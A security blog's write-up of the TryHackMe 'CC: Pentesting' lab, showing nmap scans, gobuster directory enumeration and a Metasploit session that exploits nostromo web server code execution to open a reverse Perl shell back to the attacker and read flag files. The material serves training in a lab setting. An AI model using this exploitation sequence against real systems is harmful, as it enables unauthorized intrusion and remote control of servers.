<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - CC Pentesting" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-cc-pentesting/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-cc-pentesting/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-15T20:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - CC Pentesting" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - CC Pentesting","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2020-12-15T20:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-cc-pentesting/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-cc-pentesting/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - CC Pentesting | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - CC Pentesting</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - CC Pentesting</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 15, 2020, 8:00 PM +0530" > Dec 15, 2020 <i class="unloaded">2020-12-15T20:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2280 words">12 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="cc-pentesting"><a href="https://tryhackme.com/room/ccpentesting" target="_blank">CC: Pentesting</a></h2><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a></p><h2 id="task-2---network-utilities---nmap">Task 2 - Network Utilities - nmap</h2><h3 id="references">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Answer to all 4 questions at the last can be obtained from one single nmap command.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-sV%20-sC%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -sV -sC &lt;ip&gt;
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Nmap%20scan%20report%20for%20%3Cip%3E%0AHost%20is%20up%20(0.18s%20latency).%0ANot%20shown:%20999%20closed%20ports%0APORT%20%20%20STATE%20SERVICE%20VERSION%0A80/tcp%20open%20%20http%20%20%20%20%3Cservice%3E%20httpd%20%3Cversion%3E%20((Ubuntu))%0A%7C_http-title:%20%3Ctitle%3E%0A%0AService%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2018.06%20seconds" type="button"></button></div></div><pre><code>Nmap scan report for &lt;ip&gt;
Host is up (0.18s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    &lt;service&gt; httpd &lt;version&gt; ((Ubuntu))
|_http-title: &lt;title&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.06 seconds
</code></pre><h2 id="task-4---web-enumeration---gobuster">Task 4 - Web enumeration - gobuster</h2><h3 id="references-1">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-gobuster" target="_blank">Gobuster Reference</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-gobuster/" target="_blank">Gobuster Reference</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists---rockyou" target="_blank">Wordlist Reference</a></ul><p>It is better to use rockyou.txt wordlist than common.txt wordlist in dirb. To setup rockyou.txt wordlist, check the <a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists-rockyou" target="_blank">link</a>. For quicker results, use common.txt wordlist in dirb.</p><p>Deploy the machine and scan the url.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20http://%3Cip%3E%20-w%20/usr/share/dirb/wordlists/common.txt%20--no-error" type="button"></button></div></div><pre><code>gobuster dir -u http://&lt;ip&gt; -w /usr/share/dirb/wordlists/common.txt --no-error
</code></pre><p>An output similar to following will be obtained, which will reveal a hidden directory.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="===============================================================%0AGobuster%20v3.1.0%0Aby%20OJ%20Reeves%20(@TheColonial)%20&amp;%20Christian%20Mehlmauer%20(@firefart)%0A===============================================================%0A[+]%20Url:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http://%3Cip%3E%0A[+]%20Method:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GET%0A[+]%20Threads:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010%0A[+]%20Wordlist:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20/usr/share/dirb/wordlists/common.txt%0A[+]%20Negative%20Status%20codes:%20%20%20404%0A[+]%20User%20Agent:%20%20%20%20%20%20%20%20%20%20%20%20%20%20gobuster/3.1.0%0A[+]%20Timeout:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010s%0A===============================================================%0A2020/12/24%2001:43:22%20Starting%20gobuster%20in%20directory%20enumeration%20mode%0A===============================================================%0A/.htaccess%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.hta%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.htpasswd%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/index.html%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%2011321]%0A/%3Cflag%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20301)%20[Size:%20315]%20[--%3E%20http://10.10.224.132/%3Cflag%3E/]%0A/server-status%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A%0A===============================================================%0A2020/12/24%2001:45:02%20Finished%0A===============================================================" type="button"></button></div></div><pre><code>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://&lt;ip&gt;
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/12/24 01:43:22 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/&lt;flag&gt;               (Status: 301) [Size: 315] [--&gt; http://10.10.224.132/&lt;flag&gt;/]
/server-status        (Status: 403) [Size: 278]

===============================================================
2020/12/24 01:45:02 Finished
===============================================================
</code></pre><p>Scan the url again with extension option to get hidden file.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20http://%3Cip%3E%20-w%20/usr/share/dirb/wordlists/common.txt%20-x%20xxa%20--random-agent%20--no-error" type="button"></button></div></div><pre><code>gobuster dir -u http://&lt;ip&gt; -w /usr/share/dirb/wordlists/common.txt -x xxa --random-agent --no-error
</code></pre><p>An output similar to following will be obtained, which will reveal a hidden file with xxa extension.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="===============================================================%0AGobuster%20v3.1.0%0Aby%20OJ%20Reeves%20(@TheColonial)%20&amp;%20Christian%20Mehlmauer%20(@firefart)%0A===============================================================%0A[+]%20Url:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http://%3Cip%3E%0A[+]%20Method:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GET%0A[+]%20Threads:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010%0A[+]%20Wordlist:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20/usr/share/dirb/wordlists/common.txt%0A[+]%20Negative%20Status%20codes:%20%20%20404%0A[+]%20User%20Agent:%20%20%20%20%20%20%20%20%20%20%20%20%20%20Mozilla/5.0%20(Macintosh;%20U;%20PPC%20Mac%20OS%20X%2010_5_8;%20ja-jp)%20AppleWebKit/533.20.25%20(KHTML,%20like%20Gecko)%20Version/5.0.4%20Safari/533.20.27%0A[+]%20Extensions:%20%20%20%20%20%20%20%20%20%20%20%20%20%20xxa%0A[+]%20Timeout:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010s%0A===============================================================%0A2020/12/24%2001:48:43%20Starting%20gobuster%20in%20directory%20enumeration%20mode%0A===============================================================%0A/.hta%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.hta.xxa%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.htaccess%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.htpasswd%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.htaccess.xxa%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/.htpasswd.xxa%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A/index.html%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%2011321]%0A/%3Cflag%3E.xxa%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%2012]%0A/%3Cprevious-flag%3E%20%20%20%20%20%20(Status:%20301)%20[Size:%20315]%20[--%3E%20http://10.10.224.132/%3Cprevious-flag%3E/]%0A/server-status%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20278]%0A%0A===============================================================%0A2020/12/24%2001:52:24%20Finished%0A===============================================================" type="button"></button></div></div><pre><code>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://&lt;ip&gt;
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
[+] Extensions:              xxa
[+] Timeout:                 10s
===============================================================
2020/12/24 01:48:43 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.hta.xxa             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.xxa        (Status: 403) [Size: 278]
/.htpasswd.xxa        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/&lt;flag&gt;.xxa           (Status: 200) [Size: 12]
/&lt;previous-flag&gt;      (Status: 301) [Size: 315] [--&gt; http://10.10.224.132/&lt;previous-flag&gt;/]
/server-status        (Status: 403) [Size: 278]

===============================================================
2020/12/24 01:52:24 Finished
===============================================================
</code></pre><h2 id="task-10---metasploit---final-walkthrough">Task 10 - Metasploit - Final Walkthrough</h2><h3 id="references-2">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-metasploit" target="_blank">Install Metasploit</a></ul><p>Use metasploit to find the flag. Deploy the machine and fire up <code>metasploit</code>. Set the payload <code>exploit/multi/http/nostromo_code_exec</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf6%20%3E%20use%20exploit/multi/http/nostromo_code_exec%0A[*]%20Using%20configured%20payload%20cmd/unix/reverse_perl" type="button"></button></div></div><pre><code>msf6 &gt; use exploit/multi/http/nostromo_code_exec
[*] Using configured payload cmd/unix/reverse_perl
</code></pre><p>Set remote host address and port, and local host address. Local Host address is the connected IP address in THM page. This can also be found using <code>ip a</code> command output.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf6%20exploit(multi/http/nostromo_code_exec)%20%3E%20set%20RHOST%20%3Ctarget-ip%3E%0ARHOST%20=%3E%20%3Ctarget-ip%3E%0Amsf6%20exploit(multi/http/nostromo_code_exec)%20%3E%20set%20RPORT%2080%0ARPORT%20=%3E%2080%0Amsf6%20exploit(multi/http/nostromo_code_exec)%20%3E%20set%20LHOST%20%3Cvpn-ip%3E%0ALHOST%20=%3E%20%3Cvpn-ip%3E" type="button"></button></div></div><pre><code>msf6 exploit(multi/http/nostromo_code_exec) &gt; set RHOST &lt;target-ip&gt;
RHOST =&gt; &lt;target-ip&gt;
msf6 exploit(multi/http/nostromo_code_exec) &gt; set RPORT 80
RPORT =&gt; 80
msf6 exploit(multi/http/nostromo_code_exec) &gt; set LHOST &lt;vpn-ip&gt;
LHOST =&gt; &lt;vpn-ip&gt;
</code></pre><p>Check if the options are alright for exploit.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf6%20exploit(multi/http/nostromo_code_exec)%20%3E%20show%20options%0A%0AModule%20options%20(exploit/multi/http/nostromo_code_exec):%0A%0A%20%20%20Name%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A%20%20%20----%20%20%20%20%20---------------%20%20--------%20%20-----------%0A%20%20%20Proxies%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20A%20proxy%20chain%20of%20format%20type:host:port[,type:host:port][...]%0A%20%20%20RHOSTS%20%20%20%3Ctarget-ip%3E%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20host(s),%20range%20CIDR%20identifier,%20or%20hosts%20file%20with%20syntax%20'file:%3Cpath%3E'%0A%20%20%20RPORT%20%20%20%2080%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20port%20(TCP)%0A%20%20%20SRVHOST%20%200.0.0.0%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20local%20host%20or%20network%20interface%20to%20listen%20on.%20This%20must%20be%20an%20address%20on%20the%20local%20machine%20or%200.0.0.0%20to%20listen%20on%20all%20addresses.%0A%20%20%20SRVPORT%20%208080%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20local%20port%20to%20listen%20on.%0A%20%20%20SSL%20%20%20%20%20%20false%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Negotiate%20SSL/TLS%20for%20outgoing%20connections%0A%20%20%20SSLCert%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Path%20to%20a%20custom%20SSL%20certificate%20(default%20is%20randomly%20generated)%0A%20%20%20URIPATH%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20The%20URI%20to%20use%20for%20this%20exploit%20(default%20is%20random)%0A%20%20%20VHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20HTTP%20server%20virtual%20host%0A%0A%0APayload%20options%20(cmd/unix/reverse_perl):%0A%0A%20%20%20Name%20%20%20Current%20Setting%20%20Required%20%20Description%0A%20%20%20----%20%20%20---------------%20%20--------%20%20-----------%0A%20%20%20LHOST%20%20%3Cvpn-ip%3E%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0A%20%20%20LPORT%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0A%0AExploit%20target:%0A%0A%20%20%20Id%20%20Name%0A%20%20%20--%20%20----%0A%20%20%200%20%20%20Automatic%20(Unix%20In-Memory)%0A" type="button"></button></div></div><pre><code>msf6 exploit(multi/http/nostromo_code_exec) &gt; show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   &lt;target-ip&gt;      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  &lt;vpn-ip&gt;         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)

</code></pre><p>Exploit and gain shell to find flags.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf6%20exploit(multi/http/nostromo_code_exec)%20%3E%20exploit%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Cvpn-ip%3E:4444%0A[*]%20Configuring%20Automatic%20(Unix%20In-Memory)%20target%0A[*]%20Sending%20cmd/unix/reverse_perl%20command%20payload%0A[*]%20Command%20shell%20session%201%20opened%20(%3Cvpn-ip%3E:4444%20-%3E%20%3Ctarget-ip%3E:49596)%20at%202020-12-24%2020:11:05%20+0530%0A%0Ashell%0A[*]%20Trying%20to%20find%20binary(python)%20on%20target%20machine%0A[*]%20Found%20python%20at%20/usr/bin/python%0A[*]%20Using%20%60python%60%20to%20pop%20up%20an%20interactive%20shell%0A[*]%20Trying%20to%20find%20binary(bash)%20on%20target%20machine%0A[*]%20Found%20bash%20at%20/bin/bash%0A%0Apwd%0A/bin%0A%0A_nostromo@ubuntu:/bin$%20cd%20/var/nostromo/htdocs%0Acd%20/var/nostromo/htdocs%0A%0A_nostromo@ubuntu:/var/nostromo/htdocs$%20ls%0Als%0Aindex.html%20%20nostromo.gif%20%20%3Cflag-1%3E%0A%0A_nostromo@ubuntu:/var/nostromo/htdocs$%20ls%20%3Cflag-1%3E%0Als%20%3Cflag-1%3E%0Anice%0A%0A_nostromo@ubuntu:/var/nostromo/htdocs$%20cat%20%3Cflag-1%3E/nice%0Acat%20%3Cflag-1%3E/nice%0A%3Cflag-2%3E%0A%0AAbort%20session%201?%20[y/N]%20%20y%0A%0A[*]%20%3Ctarget-ip%3E%20-%20Command%20shell%20session%201%20closed.%20%20Reason:%20User%20exit" type="button"></button></div></div><pre><code>msf6 exploit(multi/http/nostromo_code_exec) &gt; exploit

[*] Started reverse TCP handler on &lt;vpn-ip&gt;:4444
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (&lt;vpn-ip&gt;:4444 -&gt; &lt;target-ip&gt;:49596) at 2020-12-24 20:11:05 +0530

shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary(bash) on target machine
[*] Found bash at /bin/bash

pwd
/bin

_nostromo@ubuntu:/bin$ cd /var/nostromo/htdocs
cd /var/nostromo/htdocs

_nostromo@ubuntu:/var/nostromo/htdocs$ ls
ls
index.html  nostromo.gif  &lt;flag-1&gt;

_nostromo@ubuntu:/var/nostromo/htdocs$ ls &lt;flag-1&gt;
ls &lt;flag-1&gt;
nice

_nostromo@ubuntu:/var/nostromo/htdocs$ cat &lt;flag-1&gt;/nice
cat &lt;flag-1&gt;/nice
&lt;flag-2&gt;

Abort session 1? [y/N]  y

[*] &lt;target-ip&gt; - Command shell session 1 closed.  Reason: User exit
